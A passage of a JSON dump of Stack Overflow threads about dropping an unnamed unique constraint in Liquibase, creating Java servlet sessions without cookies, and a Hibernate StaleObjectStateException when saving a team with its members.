you</strong></em></p>\n"},{"tags":[],"owner":{"account_id":3577732,"reputation":181,"user_id":2986579,"display_name":"Rupesh"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1638332671,"creation_date":1638332361,"answer_id":70179083,"question_id":24872539,"body_markdown":"I have had the same issue and I didn&#39;t want to drop the column and create a new one. Basically the question for me was `How to find the Constraint Name for the Unique Key Constraint`. \r\n\r\nHere is how I found the Unique Key Constraint Name on MySQL WorkBench:\r\n\r\n1. Open the Table Inspector for the table `person`.\r\n2. Click on DDL tab.\r\n3. You should see the DDL statement for the table. Something like this:\r\n```\r\nCREATE TABLE `person` (\r\n`id` varchar(6) NOT NULL,\r\n`name` varchar(30) NOT NULL,\r\n...\r\nPRIMARY KEY (`id`),\r\nUNIQUE KEY `name` (`name `),\r\n...\r\n)\r\n```\r\nFor me, the name of the column and the name of the unique key constraint associated were same.\r\n\r\nIn any case the structure is like this:\r\n`UNIQUE KEY &#39;CONSTRAINT_NAME&#39; (&#39;COLUMN_NAME&#39;)`\r\n\r\nI ended up with this `changeSet`:\r\n```\r\n&lt;changeSet author=&quot;rockstar&quot; id=&quot;dropUniqueConstraint-example&quot;&gt;\r\n    &lt;dropUniqueConstraint \r\n            constraintName=&quot;name&quot;\r\n            schemaName=&quot;public&quot;\r\n            tableName=&quot;person&quot;\r\n            uniqueColumns=&quot;name&quot;/&gt;\r\n&lt;/changeSet&gt;\r\n```\r\nI didn&#39;t have to specify the `catalogName`.","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>I have had the same issue and I didn't want to drop the column and create a new one. Basically the question for me was <code>How to find the Constraint Name for the Unique Key Constraint</code>.</p>\n<p>Here is how I found the Unique Key Constraint Name on MySQL WorkBench:</p>\n<ol>\n<li>Open the Table Inspector for the table <code>person</code>.</li>\n<li>Click on DDL tab.</li>\n<li>You should see the DDL statement for the table. Something like this:</li>\n</ol>\n<pre><code>CREATE TABLE `person` (\n`id` varchar(6) NOT NULL,\n`name` varchar(30) NOT NULL,\n...\nPRIMARY KEY (`id`),\nUNIQUE KEY `name` (`name `),\n...\n)\n</code></pre>\n<p>For me, the name of the column and the name of the unique key constraint associated were same.</p>\n<p>In any case the structure is like this:\n<code>UNIQUE KEY 'CONSTRAINT_NAME' ('COLUMN_NAME')</code></p>\n<p>I ended up with this <code>changeSet</code>:</p>\n<pre><code>&lt;changeSet author=&quot;rockstar&quot; id=&quot;dropUniqueConstraint-example&quot;&gt;\n    &lt;dropUniqueConstraint \n            constraintName=&quot;name&quot;\n            schemaName=&quot;public&quot;\n            tableName=&quot;person&quot;\n            uniqueColumns=&quot;name&quot;/&gt;\n&lt;/changeSet&gt;\n</code></pre>\n<p>I didn't have to specify the <code>catalogName</code>.</p>\n"},{"tags":[],"owner":{"account_id":23154670,"reputation":159,"user_id":17256101,"display_name":"Amir Shaikh"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683718535,"creation_date":1683717941,"answer_id":76217825,"question_id":24872539,"body_markdown":"Follow Below Approach.\r\n=============================\r\n\r\n&gt; **STEP 1:**  **Find the name of the constraint** by querying the database metadata\r\n\r\n    SELECT constraint_name, table_name FROM \r\n    information_schema.table_constraints\r\n    WHERE table_name = &#39;your_table_name&#39; AND constraint_type = &#39;UNIQUE&#39;;\r\n\r\n&gt; **STEP 2:** **Drop the constraint** (Replace your_constraint_name and your_table_name with the appropriate values.)\r\n\r\n    &lt;changeSet author=&quot;yourname&quot; id=&quot;drop-unique-constraint&quot;&gt;\r\n        &lt;dropUniqueConstraint constraintName=&quot;your_constraint_name&quot; tableName=&quot;your_table_name&quot;/&gt;\r\n    &lt;/changeSet&gt;\r\n\r\n","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<h1>Follow Below Approach.</h1>\n<blockquote>\n<p><strong>STEP 1:</strong>  <strong>Find the name of the constraint</strong> by querying the database metadata</p>\n</blockquote>\n<pre><code>SELECT constraint_name, table_name FROM \ninformation_schema.table_constraints\nWHERE table_name = 'your_table_name' AND constraint_type = 'UNIQUE';\n</code></pre>\n<blockquote>\n<p><strong>STEP 2:</strong> <strong>Drop the constraint</strong> (Replace your_constraint_name and your_table_name with the appropriate values.)</p>\n</blockquote>\n<pre><code>&lt;changeSet author=&quot;yourname&quot; id=&quot;drop-unique-constraint&quot;&gt;\n    &lt;dropUniqueConstraint constraintName=&quot;your_constraint_name&quot; tableName=&quot;your_table_name&quot;/&gt;\n&lt;/changeSet&gt;\n</code></pre>\n"}],"owner":{"account_id":159676,"reputation":88183,"user_id":379235,"accept_rate":62,"display_name":"daydreamer"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":23109,"favorite_count":0,"down_vote_count":0,"up_vote_count":17,"answer_count":10,"score":17,"last_activity_date":1683718535,"creation_date":1405968790,"question_id":24872539,"body_markdown":"This is what my column looks like  \r\n\r\n            &lt;column name=&quot;name&quot; type=&quot;VARCHAR(255)&quot;&gt;\r\n                &lt;constraints nullable=&quot;false&quot; unique=&quot;true&quot;/&gt;\r\n            &lt;/column&gt;\r\n\r\nI want to remove `unique=true` constraint. \r\n\r\nI looked at what [liquibase][1] has to offer and it has  \r\n\r\n    &lt;changeSet author=&quot;liquibase-docs&quot; id=&quot;dropUniqueConstraint-example&quot;&gt;\r\n        &lt;dropUniqueConstraint catalogName=&quot;cat&quot;\r\n                constraintName=&quot;const_name&quot;\r\n                schemaName=&quot;public&quot;\r\n                tableName=&quot;person&quot;\r\n                uniqueColumns=&quot;A String&quot;/&gt;\r\n    &lt;/changeSet&gt;\r\n\r\nNow since `constraintName` is required and I do not have it, what are my options?  \r\n\r\nHow can I drop `unique=true` using liquibase?\r\n\r\n  [1]: http://www.liquibase.org/documentation/changes/drop_unique_constraint.html","title":"Liquibase: How to drop unique constraint with no constraint name?","body":"<p>This is what my column looks like  </p>\n\n<pre><code>        &lt;column name=\"name\" type=\"VARCHAR(255)\"&gt;\n            &lt;constraints nullable=\"false\" unique=\"true\"/&gt;\n        &lt;/column&gt;\n</code></pre>\n\n<p>I want to remove <code>unique=true</code> constraint. </p>\n\n<p>I looked at what <a href=\"http://www.liquibase.org/documentation/changes/drop_unique_constraint.html\">liquibase</a> has to offer and it has  </p>\n\n<pre><code>&lt;changeSet author=\"liquibase-docs\" id=\"dropUniqueConstraint-example\"&gt;\n    &lt;dropUniqueConstraint catalogName=\"cat\"\n            constraintName=\"const_name\"\n            schemaName=\"public\"\n            tableName=\"person\"\n            uniqueColumns=\"A String\"/&gt;\n&lt;/changeSet&gt;\n</code></pre>\n\n<p>Now since <code>constraintName</code> is required and I do not have it, what are my options?  </p>\n\n<p>How can I drop <code>unique=true</code> using liquibase?</p>\n"},{"tags":["java","session","servlets","server","server-side"],"comments":[{"owner":{"account_id":9760,"reputation":85859,"user_id":18157,"accept_rate":100,"display_name":"Jim Garrison"},"score":0,"creation_date":1683579367,"post_id":76204279,"comment_id":134385580,"body_markdown":"Does `getSession(false)` work?","body":"Does <code>getSession(false)</code> work?"},{"owner":{"account_id":28551054,"reputation":21,"user_id":21855921,"display_name":"Matteo B"},"score":0,"creation_date":1683579672,"post_id":76204279,"comment_id":134385619,"body_markdown":"Thanks for the quick response but the false attribute is used to avoid creating a session if there isn&#39;t one. So no it&#39;s not helpfull","body":"Thanks for the quick response but the false attribute is used to avoid creating a session if there isn&#39;t one. So no it&#39;s not helpfull"},{"owner":{"account_id":8909811,"reputation":2612,"user_id":6650475,"display_name":"Andrew S"},"score":0,"creation_date":1683580016,"post_id":76204279,"comment_id":134385685,"body_markdown":"Which servlet container?  The container should (hopefully) support this configuration.  Also, if URL session encoding is used, then be aware of potential security issues, e.g., users sharing URLs, and also stale bookmarks.","body":"Which servlet container?  The container should (hopefully) support this configuration.  Also, if URL session encoding is used, then be aware of potential security issues, e.g., users sharing URLs, and also stale bookmarks."},{"owner":{"account_id":28551054,"reputation":21,"user_id":21855921,"display_name":"Matteo B"},"score":0,"creation_date":1683580205,"post_id":76204279,"comment_id":134385719,"body_markdown":"I am using Tomcat, since is a University project i am not worried about security issues right know.","body":"I am using Tomcat, since is a University project i am not worried about security issues right know."},{"owner":{"account_id":1122178,"reputation":4384,"user_id":1110291,"display_name":"rickz"},"score":0,"creation_date":1683644300,"post_id":76204279,"comment_id":134396358,"body_markdown":"What you posted is wrong.   setSessionTrackingModes is a method of the ServletContext interface, NOT HttpServletRequest.","body":"What you posted is wrong.   setSessionTrackingModes is a method of the ServletContext interface, NOT HttpServletRequest."},{"owner":{"account_id":28551054,"reputation":21,"user_id":21855921,"display_name":"Matteo B"},"score":0,"creation_date":1683716651,"post_id":76204279,"comment_id":134408405,"body_markdown":"You are right that the correct interface is ServletContext","body":"You are right that the correct interface is ServletContext"}],"answers":[{"tags":[],"owner":{"account_id":9368086,"reputation":1,"user_id":6952293,"display_name":"Pedro Guille"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1683581883,"creation_date":1683581883,"answer_id":76204528,"question_id":76204279,"body_markdown":"You have to first ask the user if he wants to use cookies this time or not, save the answer in a boolean and then use if-else to create a session either with or without cookies","title":"Create a session using JavaServlets without creating a Cookies","body":"<p>You have to first ask the user if he wants to use cookies this time or not, save the answer in a boolean and then use if-else to create a session either with or without cookies</p>\n"},{"tags":[],"owner":{"account_id":28551054,"reputation":21,"user_id":21855921,"display_name":"Matteo B"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683717454,"creation_date":1683717454,"answer_id":76217763,"question_id":76204279,"body_markdown":"I have created a work-around solution that creates the session and then deletes the cookies created by it. In this way nothing is left in the user browser after the creation of the session.\r\n\r\n**First action**: create session and get the origin url of the request:\r\n\r\n    HttpSession session = request.getSession();\r\n    String origin = request.getHeader(&quot;referer&quot;);\r\n\r\n**Second action**: use encodeURL to ensure that the session works even if the cookies are disabled from the browser:\r\n\r\n    String encodedURL = origin;\r\n    encodedURL = response.encodeURL(origin);\r\n\r\n**Third action**: check if the URL rewriting has been done, in case is not (*meaning that cookies are enabled*) manually rewrite it:\r\n\r\n     if(Objects.equals(encodedURL, origin)){\r\n                String JSESSIONID=session.getId();\r\n                encodedURL =encodedURL +&quot;JSESSIONID=&quot;+JSESSIONID;\r\n\r\n**Fourth action**: delete cookies: \r\n\r\n    Cookie [] cookies= request.getCookies();\r\n                for(Cookie i:cookies){\r\n                    i.setMaxAge(0);\r\n                    response.addCookie(i);\r\n                }\r\n\r\n**FIfth action**: Redirect using the encodedURL:\r\n\r\n    response.sendRedirect(encodedURL);\r\n\r\n\r\nThis solution is partial because the session creation still produce a cookie but the fourth action deletes it, &quot;fixing&quot; the issue.","title":"Create a session using JavaServlets without creating a Cookies","body":"<p>I have created a work-around solution that creates the session and then deletes the cookies created by it. In this way nothing is left in the user browser after the creation of the session.</p>\n<p><strong>First action</strong>: create session and get the origin url of the request:</p>\n<pre><code>HttpSession session = request.getSession();\nString origin = request.getHeader(&quot;referer&quot;);\n</code></pre>\n<p><strong>Second action</strong>: use encodeURL to ensure that the session works even if the cookies are disabled from the browser:</p>\n<pre><code>String encodedURL = origin;\nencodedURL = response.encodeURL(origin);\n</code></pre>\n<p><strong>Third action</strong>: check if the URL rewriting has been done, in case is not (<em>meaning that cookies are enabled</em>) manually rewrite it:</p>\n<pre><code> if(Objects.equals(encodedURL, origin)){\n            String JSESSIONID=session.getId();\n            encodedURL =encodedURL +&quot;JSESSIONID=&quot;+JSESSIONID;\n</code></pre>\n<p><strong>Fourth action</strong>: delete cookies:</p>\n<pre><code>Cookie [] cookies= request.getCookies();\n            for(Cookie i:cookies){\n                i.setMaxAge(0);\n                response.addCookie(i);\n            }\n</code></pre>\n<p><strong>FIfth action</strong>: Redirect using the encodedURL:</p>\n<pre><code>response.sendRedirect(encodedURL);\n</code></pre>\n<p>This solution is partial because the session creation still produce a cookie but the fourth action deletes it, &quot;fixing&quot; the issue.</p>\n"}],"owner":{"account_id":28551054,"reputation":21,"user_id":21855921,"display_name":"Matteo B"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":128,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":2,"score":2,"last_activity_date":1683717454,"creation_date":1683579059,"question_id":76204279,"body_markdown":"# How to create a session without creating the cookie with JavaServlets?\r\nThe `request.getSession()` method allows to create a session and creates a cookie with the JSESSIONID attribute. \r\n\r\nNow if we want to handle the situation in which cookies are disabled we can use the command `response.encodeURL(&quot;path&quot;)` which adds the session ID to the url only if it&#39;s necessary.\r\n\r\nSo:\r\n\r\n```\r\nHttpSession session = request.getSession();\r\nString encodedURL=response.encodeURL(&quot;path&quot;)\r\n```\r\n\r\n\r\nThis seems to cover all the possibilities but i have a particular need: i want to offer to the user the possibility to **not allow any cookies even if they are enabled in the browser**. In this if cookies are disabled everything works fine because the encodeURL manages it. But if the **cookies are enabled** i can&#39;t find i cannot use  the previous solution because the first instruction **creates the session and consequently the Cookie**.\r\n\r\nIs there a way to ***create a session without setting immediately the cookie***? \r\n\r\nThere could be a solution with ServletContext.setSessionTrackingModes() but i didn&#39;t quite found the answer.","title":"Create a session using JavaServlets without creating a Cookies","body":"<h1>How to create a session without creating the cookie with JavaServlets?</h1>\n<p>The <code>request.getSession()</code> method allows to create a session and creates a cookie with the JSESSIONID attribute.</p>\n<p>Now if we want to handle the situation in which cookies are disabled we can use the command <code>response.encodeURL(&quot;path&quot;)</code> which adds the session ID to the url only if it's necessary.</p>\n<p>So:</p>\n<pre><code>HttpSession session = request.getSession();\nString encodedURL=response.encodeURL(&quot;path&quot;)\n</code></pre>\n<p>This seems to cover all the possibilities but i have a particular need: i want to offer to the user the possibility to <strong>not allow any cookies even if they are enabled in the browser</strong>. In this if cookies are disabled everything works fine because the encodeURL manages it. But if the <strong>cookies are enabled</strong> i can't find i cannot use  the previous solution because the first instruction <strong>creates the session and consequently the Cookie</strong>.</p>\n<p>Is there a way to <em><strong>create a session without setting immediately the cookie</strong></em>?</p>\n<p>There could be a solution with ServletContext.setSessionTrackingModes() but i didn't quite found the answer.</p>\n"},{"tags":["java","spring","spring-boot","jpa","spring-data-jpa"],"comments":[{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1625139968,"post_id":68209473,"comment_id":120551289,"body_markdown":"`new MemberId(0L, savedTeam.getTeamID())` should cause problems for any team with more than one member, shouldn&#39;t it?","body":"<code>new MemberId(0L, savedTeam.getTeamID())</code> should cause problems for any team with more than one member, shouldn&#39;t it?"},{"owner":{"account_id":9718400,"reputation":55,"user_id":7207914,"display_name":"Nikola"},"score":0,"creation_date":1625140570,"post_id":68209473,"comment_id":120551547,"body_markdown":"Why? I dont get it.","body":"Why? I dont get it."},{"owner":{"account_id":319873,"reputation":87612,"user_id":637853,"accept_rate":50,"display_name":"Thomas"},"score":0,"creation_date":1625142872,"post_id":68209473,"comment_id":120552596,"body_markdown":"Think about having two members for team 1234: each of those would have `MemberId(0, 1234)`. Do you see the problem? Hint: the ids would be the same.","body":"Think about having two members for team 1234: each of those would have <code>MemberId(0, 1234)</code>. Do you see the problem? Hint: the ids would be the same."},{"owner":{"account_id":9718400,"reputation":55,"user_id":7207914,"display_name":"Nikola"},"score":0,"creation_date":1625145210,"post_id":68209473,"comment_id":120553780,"body_markdown":"I understand that, but when hibernate saves member it doesnt metter which memberiD is  ,auto incremented PK is generated ,so MemberId becomes(generated_value,1234) in table in database, isnt it?","body":"I understand that, but when hibernate saves member it doesnt metter which memberiD is  ,auto incremented PK is generated ,so MemberId becomes(generated_value,1234) in table in database, isnt it?"}],"answers":[{"tags":[],"owner":{"account_id":13364004,"reputation":1211,"user_id":11034353,"display_name":"L_Cleo"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1625140750,"creation_date":1625140750,"answer_id":68209772,"question_id":68209473,"body_markdown":"First off, don&#39;t let the controller handle repository interactions, it&#39;s a bad practice usually. Instead use a service class. However with that out of the way the class would be something like this\r\n\r\n    @Service\r\n    public class TeamService {\r\n       \r\n        private final TeamRepository teamRepo;\r\n\r\n        public TeamService(TeamRepository teamRepo) {\r\n            this.teamRepo = teamRepo;\r\n        }\r\n\r\n        public Team saveTeam(Team team) {\r\n           team.getMembers().forEach(member -&gt; {\r\n               member.setMemberId(new MemberId(null, team.getTeamID()));\r\n           });\r\n           return teamRepo.save(team);\r\n        }\r\n    \r\n    }\r\n\r\nThat&#39;s about it. The members will be saved because of the cascade set to ALL which include also PERSIST. It&#39;s important to not set ids manually unless it&#39;s not an automatic id assigning strategy.\r\n\r\nYour controller would become\r\n\r\n    @PostMapping(&quot;/administrator/addTeam&quot;)\r\n    public String saveTeam(Model model,\r\n                           @NotNull @Valid\r\n                           @ModelAttribute Team team,\r\n                           BindingResult bindingResult,\r\n                           HttpServletRequest request){\r\n    \r\n        if(team.getAdministrator() == null){\r\n            Administrator administrator = (Administrator) request.getSession().getAttribute(&quot;user&quot;);\r\n            team.setAdministrator(administrator);\r\n        }\r\n    \r\n        model.addAttribute(&quot;team&quot;, teamService.saveTeam(team));\r\n        return &quot;team&quot;;\r\n    }\r\n\r\nOf course you&#39;d need to inject the TeamService as you where doing for the team repo.\r\n\r\nPS: I don&#39;t really get if the teamService is actually a Service or a Repositoy. If it&#39;s already a service then just replace the code within the .save() method","title":"Row was updated or deleted by another transaction (or unsaved-value mapping was incorrect) Spring jpa","body":"<p>First off, don't let the controller handle repository interactions, it's a bad practice usually. Instead use a service class. However with that out of the way the class would be something like this</p>\n<pre><code>@Service\npublic class TeamService {\n   \n    private final TeamRepository teamRepo;\n\n    public TeamService(TeamRepository teamRepo) {\n        this.teamRepo = teamRepo;\n    }\n\n    public Team saveTeam(Team team) {\n       team.getMembers().forEach(member -&gt; {\n           member.setMemberId(new MemberId(null, team.getTeamID()));\n       });\n       return teamRepo.save(team);\n    }\n\n}\n</code></pre>\n<p>That's about it. The members will be saved because of the cascade set to ALL which include also PERSIST. It's important to not set ids manually unless it's not an automatic id assigning strategy.</p>\n<p>Your controller would become</p>\n<pre><code>@PostMapping(&quot;/administrator/addTeam&quot;)\npublic String saveTeam(Model model,\n                       @NotNull @Valid\n                       @ModelAttribute Team team,\n                       BindingResult bindingResult,\n                       HttpServletRequest request){\n\n    if(team.getAdministrator() == null){\n        Administrator administrator = (Administrator) request.getSession().getAttribute(&quot;user&quot;);\n        team.setAdministrator(administrator);\n    }\n\n    model.addAttribute(&quot;team&quot;, teamService.saveTeam(team));\n    return &quot;team&quot;;\n}\n</code></pre>\n<p>Of course you'd need to inject the TeamService as you where doing for the team repo.</p>\n<p>PS: I don't really get if the teamService is actually a Service or a Repositoy. If it's already a service then just replace the code within the .save() method</p>\n"},{"tags":[],"owner":{"account_id":23026899,"reputation":1,"user_id":17146985,"display_name":"BigMissile"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1683717211,"creation_date":1683717143,"answer_id":76217707,"question_id":68209473,"body_markdown":"If you use cascade=cascadeType.All, you shouldn&#39;t save team first then save members separately afterward. This causes confusion to the transaction. What you should do is set members to teamForSave first then save it:\r\n    \r\n    List&lt;Member&gt; membersForSave = new ArrayList&lt;&gt;();\r\n    if (team.getMembers != null) {\r\n      for (Member m : team.getMembers()) {\r\n            Member member = new Member(new MemberId(0L, savedTeam.getTeamID())\r\n                    ,m.getName()\r\n                    ,m.getMail()\r\n                    ,m.getLastName()\r\n                    ,m.getRole()\r\n                    ,savedTeam);\r\n\r\n            membersForSave.add(member);\r\n        }\r\n    }\r\n    \r\n    Team teamForSave = new Team(0L, team.getName(), membersForSave, new HashSet&lt;&gt;(), team.getMentor(), team.getAdministrator(), team.getHackathon());\r\n\r\nYou should do the same with marks, too.\r\nIn case you want to save child entities manually like you&#39;re doing in your controller, remove cascadeType.All in your entity (Team)","title":"Row was updated or deleted by another transaction (or unsaved-value mapping was incorrect) Spring jpa","body":"<p>If you use cascade=cascadeType.All, you shouldn't save team first then save members separately afterward. This causes confusion to the transaction. What you should do is set members to teamForSave first then save it:</p>\n<pre><code>List&lt;Member&gt; membersForSave = new ArrayList&lt;&gt;();\nif (team.getMembers != null) {\n  for (Member m : team.getMembers()) {\n        Member member = new Member(new MemberId(0L, savedTeam.getTeamID())\n                ,m.getName()\n                ,m.getMail()\n                ,m.getLastName()\n                ,m.getRole()\n                ,savedTeam);\n\n        membersForSave.add(member);\n    }\n}\n\nTeam teamForSave = new Team(0L, team.getName(), membersForSave, new HashSet&lt;&gt;(), team.getMentor(), team.getAdministrator(), team.getHackathon());\n</code></pre>\n<p>You should do the same with marks, too.\nIn case you want to save child entities manually like you're doing in your controller, remove cascadeType.All in your entity (Team)</p>\n"}],"owner":{"account_id":9718400,"reputation":55,"user_id":7207914,"display_name":"Nikola"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":1084,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1683717211,"creation_date":1625139489,"question_id":68209473,"body_markdown":"Im trying to save Team then to save all of his members but im facing this error . I searched a lot for this common problem but i don&#39;t realise where the problem is.\r\n\r\nError:\r\n```\r\norg.hibernate.StaleObjectStateException: Row was updated or deleted by another transaction (or unsaved-value mapping was incorrect) : [com.hackathon.web.domain.Member#com.hackathon.web.domain.MemberId@dc6]\r\n\tat org.hibernate.persister.entity.AbstractEntityPersister.check(AbstractEntityPersister.java:2648) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.persister.entity.AbstractEntityPersister.update(AbstractEntityPersister.java:3491) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.persister.entity.AbstractEntityPersister.updateOrInsert(AbstractEntityPersister.java:3354) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.persister.entity.AbstractEntityPersister.update(AbstractEntityPersister.java:3768) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.action.internal.EntityUpdateAction.execute(EntityUpdateAction.java:201) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:604) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n\tat org.hibernate.engine.spi.ActionQueue.lambda$executeActions$1(ActionQueue.java:478) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\r\n```\r\n\r\nTeam class:\r\n\r\n    public class Team {\r\n\r\n    @Id\r\n    @GeneratedValue(strategy = GenerationType.IDENTITY)\r\n    @Column(name=&quot;teamid&quot;)\r\n    private Long teamID;\r\n\r\n    private String name;\r\n\r\n\r\n    @ToString.Exclude\r\n    @OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER,orphanRemoval = true)\r\n    @JoinColumn(name=&quot;teamid&quot;)\r\n    private List&lt;Member&gt; members;\r\n\r\n\r\n\r\n\r\n    @OneToMany(mappedBy = &quot;team&quot;,cascade = CascadeType.ALL,fetch = FetchType.EAGER)\r\n    @ToString.Exclude\r\n    private Set&lt;Mark&gt; marks;\r\n\r\n\r\n    @ManyToOne\r\n    @JoinColumn(name = &quot;mentorid&quot;,insertable = true, updatable = true)\r\n    @ToString.Exclude\r\n    private Mentor mentor;\r\n\r\n\r\n    @ManyToOne\r\n    @JoinColumn(name = &quot;administratorid&quot;,insertable = true, updatable = true)\r\n    @ToString.Exclude\r\n    private Administrator administrator;\r\n\r\n\r\n    @ManyToOne\r\n    @JoinColumn(name = &quot;hackathonid&quot;,insertable = true, updatable = true)\r\n    @ToString.Exclude\r\n    private Hackathon hackathon;}\r\n\r\nMember class:\r\n\r\n    public class Member {\r\n\r\n    @EmbeddedId\r\n    private MemberId id;\r\n\r\n    private String name;\r\n\r\n    private String mail;\r\n\r\n    private String lastName;\r\n\r\n    private String role;\r\n\r\n    @ManyToOne(fetch = FetchType.LAZY,cascade = ALL)\r\n    @JoinColumn(name=&quot;teamid&quot;,insertable = false, updatable = false )\r\n    private Team team;}\r\n\r\nMemberId class:\r\n\r\n    public class MemberId implements Serializable {\r\n\r\n\r\n    @GeneratedValue(strategy = GenerationType.AUTO)\r\n    private Long memberID;\r\n\r\n    @Column(insertable=true, updatable=true)\r\n    private Long teamID;}\r\n\r\n  \r\nController:\r\n\r\n    @PostMapping(&quot;/administrator/addTeam&quot;)\r\n    public String saveTeam(Model model,\r\n                          @NotNull @Valid\r\n                           @ModelAttribute Team team,\r\n                           BindingResult bindingResult,\r\n                           HttpServletRequest request){\r\n\r\n        if(team.getAdministrator() == null){\r\n            Administrator administrator = (Administrator) request.getSession().getAttribute(&quot;user&quot;);\r\n            team.setAdministrator(administrator);\r\n        }\r\n\r\n        \r\n        Team teamForSave = new Team(0L,team.getName(),new ArrayList&lt;&gt;(),new HashSet&lt;&gt;(), team.getMentor(), team.getAdministrator(), team.getHackathon());\r\n\r\n        Team savedTeam = teamService.save(teamForSave);\r\n\r\n        if(team.getMembers() != null ) {\r\n            for (Member m :\r\n                    team.getMembers()) {\r\n                Member member = new Member(new MemberId(0L, savedTeam.getTeamID())\r\n                        ,m.getName()\r\n                        ,m.getMail()\r\n                        ,m.getLastName()\r\n                        ,m.getRole()\r\n                        ,savedTeam);\r\n                Member savedMember = memberService.save(member);\r\n            }\r\n        }\r\n        model.addAttribute(&quot;team&quot;,savedTeam);\r\n        return &quot;team&quot;;\r\n    }\r\n\r\n\r\nHibernate logg:\r\n```\r\nHibernate: insert into team (administratorid, hackathonid, mentorid, name) values (?, ?, ?, ?)\r\nHibernate: select member0_.memberid as memberid1_5_2_, member0_.teamid as teamid2_5_2_, member0_.last_name as last_nam3_5_2_, member0_.mail as mail4_5_2_, member0_.name as name5_5_2_, member0_.role as role6_5_2_, team1_.teamid as teamid1_7_0_, team1_.administratorid as administ3_7_0_, team1_.hackathonid as hackatho4_7_0_, team1_.mentorid as mentorid5_7_0_, team1_.name as name2_7_0_, marks2_.teamid as teamid2_4_4_, marks2_.markid as markid1_4_4_, marks2_.markid as markid1_4_1_, marks2_.teamid as teamid2_4_1_, marks2_.comment as comment3_4_1_, marks2_.complexity as complexi4_4_1_, marks2_.design as design5_4_1_, marks2_.efficiency as efficien6_4_1_, marks2_.judgeid as judgeid7_4_1_ from member member0_ left outer join team team1_ on member0_.teamid=team1_.teamid left outer join mark marks2_ on team1_.teamid=marks2_.teamid where member0_.memberid=? and member0_.teamid=?\r\nHibernate: insert into member (last_name, mail, name, role, memberid, teamid) values (?, ?, ?, ?, ?, ?)\r\nHibernate: update member set last_name=?, mail=?, name=?, role=? where memberid=? and teamid=?\r\n```\r\n\r\nSo, team is saved correctly ,first member also , and then this error occurs.\r\nUse case is:\r\nIm adding new team on form ,including adding members into table,setting the randomNegativeId for each member for tracking delete from table , setting team id -1 for showing correct form in view.\r\nBut here in controller im creating new Team and copy values , so i dont know why it doesnt work.\r\nI tried to save all at once with cascading but then error is that teamid column is null on members .I really need help with this. Thanks in advance\r\n\r\n","title":"Row was updated or deleted by another transaction (or unsaved-value mapping was incorrect) Spring jpa","body":"<p>Im trying to save Team then to save all of his members but im facing this error . I searched a lot for this common problem but i don't realise where the problem is.</p>\n<p>Error:</p>\n<pre><code>org.hibernate.StaleObjectStateException: Row was updated or deleted by another transaction (or unsaved-value mapping was incorrect) : [com.hackathon.web.domain.Member#com.hackathon.web.domain.MemberId@dc6]\n    at org.hibernate.persister.entity.AbstractEntityPersister.check(AbstractEntityPersister.java:2648) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.persister.entity.AbstractEntityPersister.update(AbstractEntityPersister.java:3491) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.persister.entity.AbstractEntityPersister.updateOrInsert(AbstractEntityPersister.java:3354) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.persister.entity.AbstractEntityPersister.update(AbstractEntityPersister.java:3768) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.action.internal.EntityUpdateAction.execute(EntityUpdateAction.java:201) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:604) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n    at org.hibernate.engine.spi.ActionQueue.lambda$executeActions$1(ActionQueue.java:478) ~[hibernate-core-5.4.30.Final.jar:5.4.30.Final]\n</code></pre>\n<p>Team class:</p>\n<pre><code>public class Team {\n\n@Id\n@GeneratedValue(strategy = GenerationType.IDENTITY)\n@Column(name=&quot;teamid&quot;)\nprivate Long teamID;\n\nprivate String name;\n\n\n@ToString.Exclude\n@OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER,orphanRemoval = true)\n@JoinColumn(name=&quot;teamid&quot;)\nprivate List&lt;Member&gt; members;\n\n\n\n\n@OneToMany(mappedBy = &quot;team&quot;,cascade = CascadeType.ALL,fetch = FetchType.EAGER)\n@ToString.Exclude\nprivate Set&lt;Mark&gt; marks;\n\n\n@ManyToOne\n@JoinColumn(name = &quot;mentorid&quot;,insertable = true, updatable = true)\n@ToString.Exclude\nprivate Mentor mentor;\n\n\n@ManyToOne\n@JoinColumn(name = &quot;administratorid&quot;,insertable = true, updatable = true)\n@ToString.Exclude\nprivate Administrator administrator;\n\n\n@ManyToOne\n@JoinColumn(name = &quot;hackathonid&quot;,insertable = true, updatable = true)\n@ToString.Exclude\nprivate Hackathon 